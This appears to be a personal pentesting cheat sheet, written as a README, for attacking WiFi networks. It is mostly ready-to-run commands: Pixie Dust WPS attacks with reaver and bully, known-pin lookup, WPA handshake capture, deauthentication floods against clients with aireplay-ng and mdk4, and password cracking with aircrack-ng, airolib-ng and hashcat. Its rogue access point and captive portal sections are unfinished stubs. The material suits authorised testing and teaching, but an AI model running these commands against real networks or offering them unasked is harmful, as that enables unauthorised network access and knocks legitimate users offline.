# WIFI-PenTesting

## Basics
##### Connect to Remote Machine using RDP

```bash
rdesktop -u username -p password -g 1920x1080 -a 16 -z -x l -P -r clipboard:PRIMARYCLIPBOARD -r disk:share=/path/to/local/folder remote_server_ip
```
##### Linux basics

```bash
ssh -p 222 u@ip #ssh with port 
sudo su #switch to root
gzip -d file.txt.gz #extract .gz file
```

## Start Monitoring Mode

```bash
# Using airmo-ng
airmon-ng check
airmon-ng check kill # Kill annoying processes
airmon-ng start wlan0
airmon-ng stop wlan0mon # Managed mode
```

```bash
# Using ip and iw commands
ip link show # List available interfaces
ip link set wlan0 down
iw dev wlan0 set type monitor
ip link set wlan0 up
iw dev wlan0 scan | grep "^BSS\|SSID\|WSP\|Authentication\|WPS\|WPA" # Scan available WiFis
```

```bash
#Using iwconfig
iwconfig # List available interfaces
iwconfig wlan0 mode monitor # Put in mode monitor
iwconfig wlan0mon mode managed # Quit mode monitor - managed mode
```

## WPS Attacks

### PIXIDUST Attack

```bash
sudo reaver -b {{bssid}} -i wlan0 -v -K
sudo bully -b {{bssid}} -v 4 -d wlan0
```

```bash
# Well known pins
sudo apt install airgeddon
source /usr/share/airgeddon/known_pins.db
echo ${PINDB["0013F7"]}
```

## WPA1/2 PSK Attacks

### Capture

```bash
airodump-ng wlan0mon # Scan (default 2.4GHz)
airodump-ng wlan0mon --band a # Scan 5GHz
airodump-ng wlan0mon --wps
airodump-ng wlan0mon -c 6 --bssid {{mac address of router}} -w /tmp/psk --output-format pcap
```

### Deauthenticate

```bash
aireplay-ng -0 0 wlan0 -e {{WIFI_name}} -a {{bssid}} -c {{client}}
# To send deauth to all clients remove the -c option
mdk4 wlan0mon d -c 5 -b victim_clients_mac.txt -E {{WifiName}} -B {{bssid}}
```

### Cracking

Optimize aircrack with airolib

```bash
echo wifu > essid.txt # name of the wifi
airolib-ng wifu.sqlite --import essid essid.txt # create db for the essid
airolib-ng wifu.sqlite --import passwd /usr/share/john/password.lst # import password list into the DB
airolib-ng wifu.sqlite --batch # compute the Pairwise Master Keys (PMK)
airolib-ng wifu.sqlite --stats # show info
aircrack-ng -r wifu.sqlite wpa1-01.cap
```

```bash
aircrack-ng file.pcap # check for handshake in the file
aircrack-ng /tmp/att.pcap -w /path/to/pass/list
```
#### password listlists

```bash
/usr/share/wordlists/rockyou.txt
/usr/share/john/password.lst
/usr/share/seclist/
```

### Hashcat

```bash
sudo apt install hashcat-utils
/usr/lib/hashcat-utils/cap2hccapx.bin wifu-01.cap output.hccapx
hashcat -m 2500 output.hccapx /usr/share/john/password.lst
```

## Rogue Access Points

Create a WIFI replica using hostapd-mana to convince clients to connect to it instead of the original wifi
work in progress

## Captive Portals
work in progress

## Connect to WIFI network from the terminal

```bash
# using wpa_supplicant
# create a conf file to contaian the following 
network={
  ssid="name of the wifi"
  scan_ssid=1
  psk="password of the wifi"
  key_mgmt=WPA-PSK
}
#then run the following command
sudo wpa_supplicant -i wlan0 -c wifi-access.conf
# or use the wpa_cli interactive
wpa_cli -i wlan0
```
connect to WIFI using WPS
# [Reference](https://askubuntu.com/questions/120367/how-to-connect-to-wi-fi-ap-through-wps)
